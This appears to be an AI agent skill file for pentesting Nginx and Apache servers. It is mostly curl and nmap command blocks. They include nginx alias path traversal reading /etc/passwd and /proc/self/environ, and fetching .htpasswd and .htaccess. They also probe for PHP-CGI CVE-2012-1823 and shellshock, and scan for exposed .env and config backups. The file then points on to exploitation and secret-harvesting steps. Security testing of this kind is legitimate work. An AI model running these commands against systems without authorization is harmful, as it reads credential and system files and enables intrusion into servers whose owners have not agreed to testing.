---
name: tech-nginx-apache
description: "Nginx and Apache security testing — path traversal via alias misconfiguration, .htaccess bypass, Apache mod_status, nginx off-by-slash, server-side includes, HTTP methods abuse, server info disclosure. Triggers: 'nginx security', 'apache security', 'nginx misconfiguration', 'apache misconfiguration', 'nginx alias', 'htaccess bypass', 'apache mod_status', 'nginx off slash', 'apache pentest'."
---

# Nginx / Apache Security Testing

Test web server configuration for misconfigurations and information disclosure.

---

## Phase 1: Server Fingerprinting

```bash
TARGET="https://TARGET"

# Banner and version:
curl -s -I "$TARGET/" | grep -i "Server:\|X-Powered-By:\|X-AspNet\|X-Generator"

# Nmap web server scripts:
nmap -p 80,443 --script http-methods,http-server-header,http-headers,http-auth-finder \
  "TARGET_IP" 2>/dev/null | tee output/webserver_enum.txt

# Apache server-status:
curl -s "$TARGET/server-status" | tee output/apache_serverstatus.txt
curl -s "$TARGET/server-info" | tee output/apache_serverinfo.txt
```

---

## Phase 2: Nginx Alias Misconfiguration

```bash
TARGET="https://TARGET"

# Off-by-slash path traversal:
# Config: location /static { alias /var/www/files/; }
# If path is /static without trailing slash:
curl -s "$TARGET/static../etc/passwd" | head -5 | tee output/nginx_alias_bypass.txt
curl -s "$TARGET/static../secret.conf" | tee output/nginx_alias_secret.txt

# Common traversal attempts:
for PATH in "../etc/passwd" "../etc/nginx/nginx.conf" "../proc/self/environ"; do
  RESP=$(curl -s "$TARGET/static$PATH")
  [ -n "$RESP" ] && echo "ACCESSIBLE: $PATH" && echo "$RESP" | head -3
done | tee output/nginx_traversal.txt

# Nginx merge_slashes off bypass:
curl -s "$TARGET//../admin/" | tee output/nginx_slash_bypass.txt
```

---

## Phase 3: Apache Misconfigurations

```bash
TARGET="https://TARGET"

# .htaccess bypass:
curl -s "$TARGET/.htaccess" | head -20 | tee output/htaccess.txt

# Directory listing:
curl -s "$TARGET/icons/" | grep -i "Index of"
curl -s "$TARGET/uploads/" | grep -i "Index of"

# HTTP methods:
curl -s -X OPTIONS "$TARGET/" -I | grep "Allow:"
# If TRACE allowed:
curl -s -X TRACE "$TARGET/" -H "Custom: header" | tee output/trace_response.txt

# Apache .htpasswd disclosure:
curl -s "$TARGET/.htpasswd" | tee output/htpasswd.txt

# PHP CGI bug (CVE-2012-1823):
curl -s "$TARGET/index.php?-s" | grep -i "<?php" | head -5

# Apache struts:
nmap -p 80,443 --script http-shellshock "$TARGET_IP" 2>/dev/null
```

---

## Phase 4: Common Backup Files

```bash
TARGET="https://TARGET"

# Backup and config file leakage:
for FILE in ".git/HEAD" ".svn/entries" ".env" ".env.backup" \
            "config.php.bak" "wp-config.php.bak" "database.yml" \
            "settings.py.bak" "application.properties" \
            "nginx.conf" "httpd.conf" ".htpasswd" "web.config"; do
  STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET/$FILE")
  [ "$STATUS" == "200" ] && echo "EXPOSED: $FILE (HTTP $STATUS)"
done | tee output/backup_files.txt

# Virtual host mismatch (returns default page):
curl -s -H "Host: notexists.example.com" "$TARGET/" | head -5
```

---

## Output

Save to `output/`:
- `nginx_alias_bypass.txt` — alias traversal results
- `apache_serverstatus.txt` — server status page
- `backup_files.txt` — exposed configuration files

## Next Phase

→ `vuln-path-traversal` for further traversal exploitation
→ `recon-secrets` for secret scanning in exposed config files
